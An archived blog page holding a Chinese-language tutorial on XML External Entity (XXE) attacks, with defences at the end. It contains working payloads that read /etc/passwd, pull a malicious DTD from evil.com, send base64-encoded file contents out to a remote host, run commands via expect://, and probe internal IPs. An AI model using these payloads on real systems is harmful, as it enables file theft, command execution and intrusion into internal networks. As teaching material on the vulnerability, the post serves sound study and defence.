<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<title>
  
    Archive: 2016/6
  
</title>

<meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="0kami's Blog">
<meta property="og:url" content="http://yoursite.com/archives/2016/06/index.html">
<meta property="og:site_name" content="0kami's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="0kami's Blog">
<meta name="twitter:description">


  <link rel="alternative" href="/atom.xml" title="0kami&#39;s Blog" type="application/atom+xml">



  <link rel="icon" href="/favicon.png">


<link rel="stylesheet" href="/styles/main.css">




  <script>
  var _hmt = _hmt || [];
  (function() {
    var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?76bc831ee102b44bd4b6c44ff85fc28c";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
  </script>



</head>
<body
  
    class="monochrome"
  
  >
  <div class="mobile-header">
  <button class="sidebar-toggle" type="button">
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
  </button>
  <a class="title" href="/">0kami&#39;s Blog</a>
</div>

  <div class="main-container">
    <div class="sidebar">
  <div class="header">
    <h1 class="title"><a href="/">0kami&#39;s Blog</a></h1>
    
    <div class="info">
      <div class="content">
        
        
          <div class="author">0kami-zj9s</div>
        
      </div>
      
        <div class="avatar">
          
            <a href="/about"><img src="https://avatars0.githubusercontent.com/u/16203770?v=3&amp;s=460"></a>
          
        </div>
      
    </div>
  </div>
  <div class="body">
    
      
        <ul class="nav">
          
            
              <li class="category-list-container">
                <a href="javascript:;">Category</a>
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/webSec/">webSec</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">1</span></li></ul>
              </li>
            
          
            
              <li class="tag-list-container">
                <a href="javascript:;">Tag</a>
                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/bctf/">bctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webVul/">webVul</a><span class="tag-list-count">2</span></li></ul>
              </li>
            
          
            
              <li class="archive-list-container">
                <a href="javascript:;">Archive</a>
                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/">2016</a><span class="archive-list-count">4</span></li></ul>
              </li>
            
          
        </ul>
      
        <ul class="nav">
          
            
              <li>
                <a href="/" title="Homepage">Homepage</a>
              </li>
            
          
            
              <li>
                <a href="/archives" title="By Year">By Year</a>
              </li>
            
          
        </ul>
      
        <ul class="nav">
          
            
              <li>
                <a href="http://weibo.com/u/1015713383" title="Weibo" target="_blank" rel="external">Weibo</a>
              </li>
            
          
            
              <li>
                <a href="https://github.com/0kami" title="Github" target="_blank" rel="external">Github</a>
              </li>
            
          
            
              <li>
                <a href="/atom.xml" title="RSS">RSS</a>
              </li>
            
          
        </ul>
      
    
  </div>
</div>

    <div class="main-content">
      
        <div style="max-width: 1000px">
      
          

  
  
    
      
      
      <section class="archives-wrap">
        <div class="archive-year-wrap">
          <h1><a href="/archives/2016" class="archive-year">2016</a></h1>
        </div>
        <div class="post-list">
    
  

    <div class="post-list-item article">
      <h3 class="article-header">
        <a href="/2016/06/28/xxe/" >
  XML External Entity(XXE)
</a>

      </h3>
      

      <div class="article-info">
        <a href="/2016/06/28/xxe/"><span class="article-date">
  2016-06-28
</span>
</a>
        
	<span class="article-category tagcloud">
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/webSec/">webSec</a></li></ul>
	</span>


        
	<span class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
	</span>


      </div>
      <div class="article-entry">
        
          <p>##0x00 描述<br>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a><br>XML例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;  xml声明</span><br><span class="line">&lt;!DOCTYPE note[   文档类型定义</span><br><span class="line">	&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">	&lt;!ELEMENT to   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT heading   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT body   (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt; 文档元素</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Test&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;This is a Test&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
<p>上述为一个XML的实例<br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>######内部声明DTD<br>&lt;!DOCTYPE 根元素 [元素声明]&gt;</p>
<p>######引用外部DTD<br>&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;或者&lt;!DOCTYPE 根元素 PUBLIC “public_ID” “文件名”&gt;<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>######内部声明实体<br>&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
<p>######引用外部实体<br>&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;或者&lt;!ENTITY 实体名称 PUBLIC “public_ID” “URI”&gt;</p>
<p>######漏洞描述摘自<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="external">OWASP</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure></p>
<p>漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>##0x01 试验<br>恶意引入外部实体方式：<br>1.本地文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure></p>
<p>2.远程文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % d SYSTEM &quot;http://evil.com/evil.dtd&quot;&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">其中evil.dtd文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>不同的语言默认支持的协议不同</p>
<table>
<thead>
<tr>
<th>libxml2</th>
<th>php</th>
<th>java</th>
<th>.net</th>
</tr>
</thead>
<tbody>
<tr>
<td>file<br>http<br>ftp</td>
<td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td>
<td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td>
<td>http<br>file<br>https<br>ftp</td>
</tr>
</tbody>
</table>
<p>上述为默认支持协议，还可以通过扩展支持其他协议，如php</p>
<table>
<thead>
<tr>
<th>scheme</th>
<th>extension required</th>
</tr>
</thead>
<tbody>
<tr>
<td>https<br>ftps</td>
<td>openssl</td>
</tr>
<tr>
<td>zip</td>
<td>zip</td>
</tr>
<tr>
<td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td>
<td>ssh2</td>
</tr>
<tr>
<td>rar</td>
<td>rar</td>
</tr>
<tr>
<td>ogg</td>
<td>oggvorbis</td>
</tr>
<tr>
<td>expect</td>
<td>expect</td>
</tr>
</tbody>
</table>
<p>######demo1 任意读取本地文件<br>php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure></p>
<p>######demo2 不回显读取内容，远程传递数据<br>php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/issue&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">远程DTD文件内容</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25 send SYSTEM &apos;http://ip/?xml=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p>
<h6 id="demo3-执行系统命令"><a href="#demo3-执行系统命令" class="headerlink" title="demo3 执行系统命令"></a>demo3 执行系统命令</h6><p>php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure></p>
<p>执行成功需要php的expect扩展</p>
<h6 id="demo4-探测内网应用"><a href="#demo4-探测内网应用" class="headerlink" title="demo4 探测内网应用"></a>demo4 探测内网应用</h6><p>php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;http://192.168.1.20:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure></p>
<p>如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用<br>同时如果找到了内容应用，可以通过这种方式攻击内网应用</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h6 id="方案一、使用开发语言提供的禁用外部实体的方法"><a href="#方案一、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一、使用开发语言提供的禁用外部实体的方法"></a>方案一、使用开发语言提供的禁用外部实体的方法</h6><p>1.PHP：<br>libxml_disable_entity_loader(true);<br>2.JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>3.Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<h6 id="方案二、过滤用户提交的XML数据"><a href="#方案二、过滤用户提交的XML数据" class="headerlink" title="方案二、过滤用户提交的XML数据"></a>方案二、过滤用户提交的XML数据</h6><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
<h3 id="参考security-tencent-com"><a href="#参考security-tencent-com" class="headerlink" title="参考security.tencent.com"></a>参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a></h3>
        
      </div>
    </div>

  






          <div class="main-footer">
  
    © 2016 0kami&#39;s Blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
  
</div>

      
        </div>
      
    </div>
  </div>
  <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>

  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">

  <!-- Root element of PhotoSwipe. Must have class pswp. -->
  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe.
             It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

      <!-- Container that holds slides.
                PhotoSwipe keeps only 3 of them in the DOM to save memory.
                Don't modify these 3 pswp__item elements, data is added later on. -->
      <div class="pswp__container">
        <div class="pswp__item"></div>
        <div class="pswp__item"></div>
        <div class="pswp__item"></div>
      </div>

      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
      <div class="pswp__ui pswp__ui--hidden">

        <div class="pswp__top-bar">

          <!--  Controls are self-explanatory. Order can be changed. -->

          <div class="pswp__counter"></div>

          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

          <button class="pswp__button pswp__button--share" title="Share"></button>

          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
          <!-- element will get class pswp__preloader--active when preloader is running -->
          <div class="pswp__preloader">
            <div class="pswp__preloader__icn">
              <div class="pswp__preloader__cut">
                <div class="pswp__preloader__donut"></div>
              </div>
            </div>
          </div>
        </div>

        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
          <div class="pswp__share-tooltip"></div>
        </div>

        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>

        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

        <div class="pswp__caption">
          <div class="pswp__caption__center"></div>
        </div>
      </div>
    </div>
  </div>

  <script src="/PhotoSwipe/photoswipe.js"></script>
  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>


<script src="/scripts/main.js"></script>

</body>
</html>
